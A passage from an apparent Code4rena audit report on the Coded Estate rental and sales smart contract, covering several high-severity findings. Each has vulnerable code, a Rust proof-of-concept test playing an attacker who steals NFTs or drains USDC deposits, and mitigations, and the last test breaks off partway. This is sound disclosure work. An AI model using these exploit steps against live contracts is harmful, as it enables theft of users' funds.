    self.increase_balance(deps.storage, info.funds[0].denom.clone(), sent_amount - Uint128::from(rent_amount))?;

    let traveler = Rental {
        denom:token.shortterm_rental.denom.clone(),
        rental_type:false,
        approved_date:None,
        deposit_amount: Uint128::from(rent_amount),
        renting_period: vec![new_checkin_timestamp, new_checkout_timestamp],
        address: Some(info.sender.clone()),
        approved: token.shortterm_rental.auto_approve,
        cancelled:false,
        guests:guests,
    };

    token
        .rentals
        .insert(placetoreserve as usize, traveler); // @c4-contest: rental is saved into rentals vector

    ...
    ... snipped
    ...
}

pub fn cancelreservationbeforeapprovalforlongterm(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    let mut position: i32 = -1;
    let mut amount = Uint128::from(0u64);
    let tenant_address = info.sender.to_string();
    // @c4-contest: rental is loaded from rentals vector
    for (i, item) in token.rentals.iter().enumerate() {
        if item.address == Some(info.sender.clone()) && item.renting_period[0].to_string() == renting_period[0]
        && item.renting_period[1].to_string() == renting_period[1]
            {
            if item.approved_date.is_some() {
                return Err(ContractError::ApprovedAlready {});
            } else {
                position = i as i32;
                amount = item.deposit_amount;
            }
        }
    }

    if position == -1 {
        return Err(ContractError::NotReserved {});
    }
    else {
        token.rentals.remove(position as usize);
        self.tokens.save(deps.storage, &token_id, &token)?;
    }

    if amount > Uint128::new(0) {
        Ok(Response::new()
        .add_attribute("action", "cancelreservationbeforeapprovalforlongterm")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: tenant_address,
            amount: vec![Coin {
                denom: token.longterm_rental.denom, // @c4-contest: Funds are sent back in long-term denom according to long-term rental agreement
                amount: amount, // @c4-contest: deposit_amount is loaded from saved short_term rental
            }],
        }))
    }
    else {
        Ok(Response::new()
        .add_attribute("action", "cancelreservationbeforeapprovalforlongterm")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
    } 
}

```

### Proof-of-Concept


The following test demonstrates the described attacker scenario.

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h8_shorterm_longterm_denom(){
    const ATTACKER: &str = "attacker";
    const ATTACKER_USELESS_DENOM: &str = "useless-coin";

    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Attacker mints a new token
    execute_mint(&mut app, &contract_addr, ATTACKER, TOKEN_ID);
    // Attacker list new short term rental, specifying useless token as denom
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: TOKEN_ID.to_string(), 
        denom: ATTACKER_USELESS_DENOM.to_string(), 
        price_per_day: 1000, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 1, 
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok());

    // Attacker list new long term rental, specifying USDC as denom
    let list_long_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForLongTermRental { 
        token_id: TOKEN_ID.to_string(),
        denom: USDC.to_string(),
        price_per_month: 1000,
        auto_approve: true,
        available_period: vec![0.to_string(),1640995200.to_string()], // 1 year availability
        minimum_stay: 0,
        cancellation: vec![],
    };
    app.execute_contract(Addr::unchecked(ATTACKER), contract_addr.clone(), &list_long_term_rental_msg, &[]).unwrap();

    // Simulate some balances
    // Attacker initially has 1000 useless tokens
    // Contract intially has 10_000 USDC (from users' deposited)
    init_denom_balance(&mut app, ATTACKER, ATTACKER_USELESS_DENOM, 1000);
    init_usdc_balance(&mut app, &contract_addr.to_string(), 10_000);

    // Attacker reserves short term rental on his own token, paying 1000 useless token
    let tmr = app.block_info().time.plus_days(1);
    let reserve_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForShortTerm { 
        token_id: TOKEN_ID.to_string(), 
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(1).seconds().to_string()], 
        guests: 0
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &reserve_short_term_rental_msg,
        &vec![Coin {
            denom: ATTACKER_USELESS_DENOM.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok());

    // Attacker rejects their own reservation through rejectreservationlongterm function
    // Note that attacker never make a reservation for a long term rental
    let reject_reservation_long_term_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::RejectReservationForLongterm {
        token_id: TOKEN_ID.to_string(),
        tenant: ATTACKER.to_string(),
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(1).seconds().to_string()]
    };

    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &reject_reservation_long_term_msg,
        &vec![],
    );

    assert!(res.is_ok());

    // Attacker gets 1000 USDC as refund, leaving 1000 useless tokens in the contract
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);
    // Asserts that conctract loses 1000 USDC to Attacker
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), USDC), 9000);

    assert_eq!(query_denom_balance(&app, ATTACKER, ATTACKER_USELESS_DENOM), 0);
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), ATTACKER_USELESS_DENOM), 1000);
}

```

1. Run `cargo test h8_shorterm_longterm_denom -- --nocapture`.
2. Observe that the test passes, indicating that the described scenario is valid.


### Recommended Mitigation


Utilize `rental_type` flag to differentiate between short-term and long-term rental and enforce usage of functions according to its type.


### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) confirmed**


## [H-05] Cancelling bid doesn’t clear token approval of bidder allows malicious bidder to steal any tokens listing for sale with auto-approve enabled


*Submitted by nnez, also found by Ch_301*

This vulnerability allows malicious actors to steal tokens on sell with auto-approve enabled without payment to sellers.


### Description


The bug arises from an oversight in the token approval management within the bidding and cancellation process. When a seller sets `auto_approve` to true for their token, a bidder is granted approval upon calling the `setbidtobuy` function. This approval is intended to allow the buyer to call the `transfer_nft` function themselves to complete the trade.

The `transfer_nft` function performs the following actions:

1. Clears all approvals.
2. Transfers ownership to the buyer.
3. Transfers funds to the seller.

However, a flaw exists in the bid cancellation process. When a buyer cancels their bid by calling `setbidtobuy` again, the function removes their bid and returns the deposited funds, but it fails to revoke the previously granted approval.

This oversight allows a malicious buyer to exploit the system through the following steps:

1. Bid on a token with `auto_approve` set to true, gaining approval.
2. Immediately cancel the bid, receiving a refund while retaining the approval.
3. Call `transfer_nft` to transfer the token to themselves without payment, as their bid has been deleted from cancelling process.

This bug effectively allows the attacker to steal the token from the seller without providing any payment to seller.

The severity is set as high because the token (property) listing for sell must have an intrinsic monetary value or else it would not make sense to list it for sale. For example, it could be a property that already has a long-term renter and is receiving a stable income from said renter.


### Relevant code snippet

```

pub fn setbidtobuy(
    &self,
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    token_id: String,
) -> Result<Response<C>, ContractError> {
    
    ...snipped...
    // @c4-contest cancellation case
    else {
        // update the approval list (remove any for the same spender before adding)
        token.bids.retain(|item| item.address != info.sender); // @c4-contest <-- remove bid but doesn't clear approvals
    }

    self.tokens.save(deps.storage, &token_id, &token)?;
    // @c4-contest cancellation case refunds the bidder
    if position != -1 && (amount > Uint128::from(0u64)) {
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: info.sender.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom,
                amount: amount,
            }],
        }))
    }
    ...snipped...

}

```

### Proof-of-Concept


The following test demonstrates the described scenario:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h6_cancel_bid_did_not_remove_bidder_from_approval() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Minter lists their token for sell with auto_approve enabled
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
    
    const ATTACKER: &str = "attacker";
    init_usdc_balance(&mut app, ATTACKER, 1000);

    // Attacker bids at target price after MINTER lists for sell  
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok());

    // Attacker immediately cancels the bid
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that Attacker gets their refunds
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000); //claimed back the fund

    // Attacker is still the approved spender, which opens for multiple attack vector  
    // Attacker invokes `transfer_nft` to transfer the token to themselves
    let transfer_nft_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::TransferNft { 
        recipient: ATTACKER.to_string(), 
        token_id: TOKEN_ID.to_string() 
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &transfer_nft_msg,
        &[],
    );
    assert!(res.is_ok()); // Everyting is ok
    
    // Asserts that Attacker now owns the token
    assert_eq!(query_token_owner(&app, &contract_addr.to_string(), TOKEN_ID), ATTACKER);
    // Asserts that Attacker pays nothing  
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);
}

```

1. Run `cargo test h6_cancel_bid_did_not_remove_bidder_from_approval -- --nocapture`.
2. Observe that the test passes, indicating that attacker successfully steal seller’s token and pay nothing to seller.


### Recommended Mitigation


Revoke approval of bidder when they cancel the bid.


### Assessed type


Context

**blockchainstar12 (Coded Estate) disputed**

*Note: For full discussion, see here.*


## [H-06] Lack of validation in setlistforsell allows changing denom while there is active bid, leading to stealing of other users’ funds


*Submitted by nnez, also found by adeolu and Ch_301 (1, 2)*

This vulnerability allows attacker to manipulate the token denom during an active bid. By exploiting this bug, attackers can cancel their own bids and receive refunds in a more valuable token than originally used, effectively stealing funds from the contract’s pool of user deposits.


### Description


The bug stems from a lack of validation in the `setlistforsell` function, which allows sellers to change the payment token (denom) even when there are active bids on a token.

The `setbidtobuy` function, when used to cancel a bid, refunds the buyer using the current denom specified for the token:

```

pub fn setlistforsell(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    islisted:bool,
    token_id: String,
    denom: String,
    price: u64,
    auto_approve: bool,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;

    // @c4-contest: no validation whether there is active bid
    token.sell.islisted = Some(islisted);
    token.sell.price = price;
    token.sell.auto_approve = auto_approve;
    token.sell.denom = denom;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforsell")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}
pub fn setbidtobuy(
    &self,
    deps: DepsMut,
    _env: Env,
    info: MessageInfo,
    token_id: String,
) -> Result<Response<C>, ContractError> {
    // ... (snipped code)

    if position != -1 && (amount > Uint128::from(0u64)) { // if the bid exists
        Ok(Response::new()
        .add_attribute("action", "setbidtobuy")
        .add_attribute("sender", info.sender.clone())
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: info.sender.to_string(),
            amount: vec![Coin {
                denom: token.sell.denom, // funds are sent back in the denom set in `setlistforsell`
                amount: amount,
            }],
        }))
    }
    // ... (snipped code)
}

```

However, the `setlistforsell` function lacks checks for active bids, allowing a seller to change the denom at any time. This creates an exploit scenario where an attacker can:

1. Mint a new token.
2. List the token for sale, specifying a low-value token (e.g., `TokenX worth $0.01`) as the denom.
3. Bid on their own token, paying with the low-value TokenX.
4. Call `setlistforsell` again, changing the denom to a high-value token (e.g., `USDC worth $1`).
5. Cancel their bid by calling `setbidtobuy`, receiving a refund in the new, more valuable USDC.

This exploit allows the attacker to drain funds from the contract that were deposited by other users. For example, if the attacker initially bid 1,000 TokenX (`$10`), they could receive 1,000 USDC (`$1,000`) as a refund, effectively stealing USDC from the contract.


### Proof-of-Concept


The following test demonstrates the described scenario:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h3_drain_funds_by_updates_selling_denom() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    const ATTACKER: &str = "attacker";
    const ATTTCKER_TOKEN_ID: &str = "attacker-token";
    const ATTACKER_USELESS_DENOM: &str = "useless-coin";
    
    // init ATTACKER useless denom balance
    init_denom_balance(&mut app, ATTACKER, ATTACKER_USELESS_DENOM, 1000);

    // Attacker mints a new token
    execute_mint(&mut app, &contract_addr, ATTACKER, ATTTCKER_TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);

    // Attacker lists for sell, specifying useless token as denom
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        denom: ATTACKER_USELESS_DENOM.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok
        
    // ATTACKER bid with useless denom
    let set_bid_to_buy_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetBidToBuy { 
        token_id: ATTTCKER_TOKEN_ID.to_string()
     };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &vec![Coin {
            denom: ATTACKER_USELESS_DENOM.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that the contract now holds 1000 useless tokens
    assert_eq!(query_denom_balance(&app, ATTACKER, ATTACKER_USELESS_DENOM), 0);
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), ATTACKER_USELESS_DENOM), 1000);

    // init balance for contract assuming there were some fund already  
    // simulating active bids or rentals on other users' property
    init_denom_balance(&mut app, &contract_addr.to_string(), USDC, 5000);

    
    // Attacker invokes setlistforsell again changing denom to USDC
    let set_list_for_sell_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForSell { 
        islisted: true, 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price: 1000, 
        auto_approve: true
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_list_for_sell_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Attacker cancels their current bid by invoking setbidtobuy
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &set_bid_to_buy_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Asserts that attacker gets 1000 USDC as a refund
    // Asserts that contract loses 1000 USDC to attacker
    assert_eq!(query_denom_balance(&app, ATTACKER, USDC), 1000);
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), USDC), 4000); //funds were drained
}

```

1. Run `cargo test h3_drain_funds_by_updates_selling_denom -- --nocapture`.
2. Observe that the test passes, indicating that the described scenario is valid.


### Recommended Mitigations


- Disallow changing `denom` while there is active bid.
- Consider introducing another function for seller to cancel all the bids (sending refunds to all bidders) because disallowing `setlistforsell` while there is active bid might also introduce a deadlock for seller.

*OR*

- Use a separate mapping variable to store each bid information.


### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) acknowledged**


## [H-07] Logic flaw in check_can_edit_short allows editing short-term rental before finalization enabling theft of users’ deposited funds


*Submitted by nnez, also found by nnez*

Malicious actor can exploit this vulnerability to steal other users’ deposited token from the contract.


### Description


The landlord (property owner) invokes `finalizeshorttermrental` on a specific rental to settle the payment. If the rental is canceled after approval or has concluded (reached check-out time), the contract sends the payment to the token owner’s address.

The bug stems from an oversight in the function that checks whether a property can be re-listed for short-term rental. 

The `finalizeshorttermrental` function uses the `denom` (token type) stored in the `shortterm_rental` struct to determine which token to use for payment:

```

fn finalizeshorttermrental(
    ...snipped...
    if amount > Uint128::new(0) {
    Ok(Response::new()
        .add_attribute("action", "finalizeshorttermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id)
        .add_message(BankMsg::Send {
            to_address: target.clone(),
            amount: vec![Coin {
                denom: token.shortterm_rental.denom, // @contest-info denom is loaded from short-term rental agreement
                amount: amount,
            }],
        }))            
    } 
    ...snipped...

```

The `setlistforshorttermrental` function, which can change this `denom`, is supposed to be callable only when there are no active rentals. This is checked by the `check_can_edit_short` function:

```

pub fn setlistforshorttermrental(
// function arguments
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, &token_id)?;
    // ensure we have permissions
    self.check_can_approve(deps.as_ref(), &env, &info, &token)?;
    self.check_can_edit_short(&env, &token)?;

    token.shortterm_rental.islisted = Some(true);
    token.shortterm_rental.price_per_day = price_per_day;
    token.shortterm_rental.available_period = available_period;
    token.shortterm_rental.auto_approve = auto_approve;
    token.shortterm_rental.denom = denom;
    token.shortterm_rental.minimum_stay = minimum_stay;
    token.shortterm_rental.cancellation = cancellation;
    self.tokens.save(deps.storage, &token_id, &token)?;

    Ok(Response::new()
        .add_attribute("action", "setlistforshorttermrental")
        .add_attribute("sender", info.sender)
        .add_attribute("token_id", token_id))
}
pub fn check_can_edit_short(
    &self,
    env:&Env,
    token:&TokenInfo<T>,
) -> Result<(), ContractError> {
    if token.rentals.len() == 0 {
        return Ok(());
    }
    else {
        let current_time = env.block.time.seconds();
        let last_check_out_time = token.rentals[token.rentals.len()-1].renting_period[1];
        if last_check_out_time < current_time {
            return Ok(());
        }
        else {
            return Err(ContractError::RentalActive {});
        }
    }
}

```

However, this function only checks if the current time exceeds the last rental’s check-out time. It doesn’t verify whether all rentals have been finalized or if there are any pending payments.

This oversight allows a malicious landlord to change the `denom` after a rental period has ended but before finalization, potentially getting payment in a more valuable token than originally configured.

The attack scenario could unfold as follows:

Attacker starts with two accounts, one as landlord and one as renter.

1. Attacker (as landlord) mints a new token and lists it for short-term rental, specifying a low-value token (e.g., `TokenX worth $0.01`) as the `denom`.
2. Attacker (as renter) reserves a short-term rental on their own token, paying with TokenX (e.g., `1,000 TokenX ≈ $10`).
3. After the rental period ends (`current time > check_out_time`), the attacker (as landlord) calls `setlistforshorttermrental` to change the `denom` to a high-value token (e.g., `USDC worth $1`).
4. Attacker then calls `finalizeshorttermrental` to settle the payment.
5. Attacker receives 1,000 USDC (`$1,000`) instead of TokenX, effectively stealing `$990` from the contract’s pool of user deposits.

This exploit allows the attacker to artificially inflate the value of their rental payment, draining funds from the contract that were deposited by other users.


### Proof-of-Concept


The following test demonstrates the described scenario:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h2_drain_funds_by_updating_listing_denoms_before_finalize() {
    let (mut app, contract_addr) = mock_app_init_contract();
    
    // Part I - Legitimate listing and reservation
    // Minter mints a new token
    execute_mint(&mut app, &contract_addr, MINTER, TOKEN_ID);
    // Asserts that token is minted
    assert_eq!(query_token_count(&app, &contract_addr.to_string()), 1);
    
    // MINTER lists short-term rental - 100 USDC a day
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price_per_day: 100, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 1, 
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(MINTER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok());

    // TRAVELER makes a reservation for 10 days, paying 1000 USDC
    init_usdc_balance(&mut app, TRAVELER, 1000);
    let tmr = app.block_info().time.plus_days(1);
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForShortTerm { 
        token_id: TOKEN_ID.to_string(), 
        renting_period: vec![tmr.seconds().to_string(), tmr.plus_days(10).seconds().to_string()], 
        guests: 1
    };
    let res = app.execute_contract(
        Addr::unchecked(TRAVELER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &vec![Coin {
            denom: USDC.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok
    // Assert that the contract now holds 1000 USDC
    assert_eq!(query_usdc_balance(&app, &contract_addr.to_string()), 1000);
    advance_blocks(&mut app, 1000);

    // Part II
    // ATTACKER Flow
    // 1. Attacker mints new token
    // 2. Attacker lists the token accepting useless coin and short staying period
    // 3. Attacker reserves their own listing 
    // 4. Attacker updates the listing denom to any denom with monetary value such as USDC
    // 5. Attacker finalizes the listing and drain USDC.
    const ATTACKER: &str = "attacker";
    const ATTTCKER_TOKEN_ID: &str = "attacker-token";
    const ATTACKER_USELESS_DENOM: &str = "useless-coin";
    
    // 1. ATTACKER mints the token
    execute_mint(&mut app, &contract_addr, ATTACKER, ATTTCKER_TOKEN_ID);
    
    // 2. ATTACKER lists short-term rental for 86_400_000 useless-coin a day and without minimum stay
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        denom: ATTACKER_USELESS_DENOM.to_string(), 
        price_per_day: 86_400_000, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 0,
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok());

    // 3. ATTACKER makes a reservation for only 1 second on their own listing, resulting in requiring 1000 useless-coin deposit 
    // Below is the calculation (Assumimg the platform fee of 0%)
    // rent_amount = token.shortterm_rental.price_per_day * (new_checkout_timestamp - new_checkin_timestamp)/(86400);
    //             = 86_400_000 * (1)/86400  //since we're making a 1 second reservation
    //             = 1000
    //
    // additional note. ATTACKER could even make a reservation in the past in order to be able to finalize the payment in the same block
    init_denom_balance(&mut app, ATTACKER, ATTACKER_USELESS_DENOM, 1000);
    let ytd = app.block_info().time.minus_days(1);
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetReservationForShortTerm { 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        renting_period: vec![ytd.seconds().to_string(), ytd.plus_seconds(1).seconds().to_string()], 
        guests: 1
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &vec![Coin {
            denom: ATTACKER_USELESS_DENOM.to_string(),
            amount: Uint128::new(1000),
        }],
    );
    assert!(res.is_ok()); // Everything is ok

     // 4. ATTACKER updates rental denom to USDC
     let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::SetListForShortTermRental { 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        denom: USDC.to_string(), 
        price_per_day: 1000, 
        auto_approve: true, 
        available_period: vec![], 
        minimum_stay: 1, 
        cancellation: vec![]
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok because current time already reached check_out_time of the last rental

    // 5. ATTACKER settles the payment
    let list_short_term_rental_msg: ExecuteMsg<Option<Empty>, Empty> = ExecuteMsg::FinalizeShortTermRental { 
        token_id: ATTTCKER_TOKEN_ID.to_string(), 
        traveler: ATTACKER.to_string(), 
        renting_period: vec![ytd.seconds().to_string(), ytd.plus_seconds(1).seconds().to_string()]
    };
    let res = app.execute_contract(
        Addr::unchecked(ATTACKER),
        contract_addr.clone(),
        &list_short_term_rental_msg,
        &[],
    );
    assert!(res.is_ok()); // Everything is ok

    // Funds were drained. Contract were left with the useless denom
    assert_eq!(query_usdc_balance(&app, &ATTACKER.to_string()), 1000);
    assert_eq!(query_usdc_balance(&app, &contract_addr.to_string()), 0);
    assert_eq!(query_denom_balance(&app, &contract_addr.to_string(), ATTACKER_USELESS_DENOM), 1000);
}

```

1. Run `cargo test h2_drain_funds_by_updating_listing_denoms_before_finalize -- --nocapture`.
2. Observe that the test passes, indicating that the described scenario is valid.


### Recommended Mitigation


Only allow editing when there is no rental.

```

pub fn check_can_edit_short(
    &self,
    env:&Env,
    token:&TokenInfo<T>,
) -> Result<(), ContractError> {
    if token.rentals.len() == 0 {
        return Ok(());
    }
        
    return Err(ContractError::RentalActive {});
}

```

### Assessed type


Invalid Validation

**blockchainstar12 (Coded Estate) confirmed**


## [H-08] Adversary can use send_nft to bypass the payment and steal seller’s token in auto-approve scenario


*Submitted by nnez, also found by Ch_301*

This vulnerability allows malicious actor to steal tokens without payment when auto-approve is enabled.


### Description


The bug arises from an oversight in the token transfer mechanisms when `auto_approve` is set to true. While the `transfer_nft` function includes logic for settling payments, the `send_nft` function does not.

When a seller enables `auto_approve`, a bidder is granted approval of the token upon calling the `setbidtobuy` function. This approval is intended to allow the buyer to use `transfer_nft` to complete the trade, as this function handles both the token transfer and payment settlement.

However, the contract fails to account for the `send_nft` function, which can also be used to transfer tokens. Unlike `transfer_nft`, `send_nft` does not include any trade settlement logic:

```

File: contracts/codedestate/src/execute.rs
fn send_nft(
    &self,
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    contract: String,
    token_id: String,
    msg: Binary,
) -> Result<Response<C>, ContractError> {
    // Transfer token
    self._transfer_nft(deps, &env, &info, &contract, &token_id)?; // @c4-contest: just transfer token, no trade settlement logic

    let send = Cw721ReceiveMsg {
        sender: info.sender.to_string(),
        token_id: token_id.clone(),
        msg,
    };

    // Send message
    Ok(Response::new()
        .add_message(send.into_cosmos_msg(contract.clone())?)
        .add_attribute("action", "send_nft")
        .add_attribute("sender", info.sender)
        .add_attribute("recipient", contract)
        .add_attribute("token_id", token_id))
}

pub fn _transfer_nft(
    &self,
    deps: DepsMut,
    env: &Env,
    info: &MessageInfo,
    recipient: &str,
    token_id: &str,
) -> Result<Response<C>, ContractError> {
    let mut token = self.tokens.load(deps.storage, token_id)?;
    // ensure we have permissions
    self.check_can_send(deps.as_ref(), env, info, &token)?;
    // set owner and remove existing approvals
    token.owner = deps.api.addr_validate(recipient)?;
    token.approvals = vec![];

    self.tokens.save(deps.storage, token_id, &token)?;
    Ok(Response::new()
    .add_attribute("action", "_transfer_nft")
    .add_attribute("sender", info.sender.clone())
    .add_attribute("token_id", token_id))
}

```

This oversight allows a malicious buyer to exploit the system through the following steps:

1. Place a bid on a token with `auto_approve` set to true, gaining approval.
2. Use `send_nft` to transfer the token to their own custom contract that implements `Cw721ReceiveMsg`, bypassing payment.
3. Cancel their original bid to receive a full refund.

This exploit effectively allows the attacker to steal the token from the seller without providing any payment to the seller.


### Proof-of-Concept


The following test demonstrates the described scenario where victim set their token on sale with `auto_approve` set to true:

Boilerplate for PoC [here](https://gist.github.com/nnez/c76b1a867dd8dc441dbe552e048b796e).

1. Replace everything in `contracts/codedestate/src/multi_tests.rs` with boilerplate from above secret gist.
2. Insert below test:

```

#[test]
fn h4_bid_and_send_nft() {

    // Implementation for Mock contract (empty)
    use cosmwasm_std::entry_point;
    use cosmwasm_schema::cw_serde;
    use cosmwasm_std::{Binary, Deps, DepsMut, Env, MessageInfo, Response, StdResult};

    #[cw_serde]
    pub struct Cw721ReceiveMsg {
        pub sender: String,
        pub token_id: String,
        pub msg: Binary,
    }
    #[cw_serde]
    pub enum MockExecuteMsg {
        ReceiveNft(Cw721ReceiveMsg),
    }

    #[entry_point]
    pub fn mock_instantiate(
        _deps: DepsMut,
        _env: Env,
        _info: MessageInfo,
        _msg: Binary,
    ) -> StdResult<Response> {
        Ok(Response::default())
    }

    #[entry_point]
    pub fn mock_execute(
        _deps: DepsMut,
        _env: Env,
        _info: MessageInfo,
        msg: MockExecuteMsg,
    ) -> StdResult<Response> {
        Ok(Response::default())
    }

    #[entry_point]
    pub fn mock_query(_deps: Deps, _env: Env, _msg: Binary) -> StdResult<Binary> {
        Ok(Binary::default())
    }

    let (mut app, contract_addr) = mock_app_init_contract();

    // Create an empty contract instance
    let empty_contract = ContractWrapper::new(mock_execute, mock_instantiate, mock_query);
    let empty_contract_id = app.store_code(Box::new(empty_contract));
    let msg: Binary = Default::default();
    let empty_contract_addr = app.instantiate_contract(
        empty_contract_id,
        Addr::unchecked(ADMIN),
        &msg,
        &[],
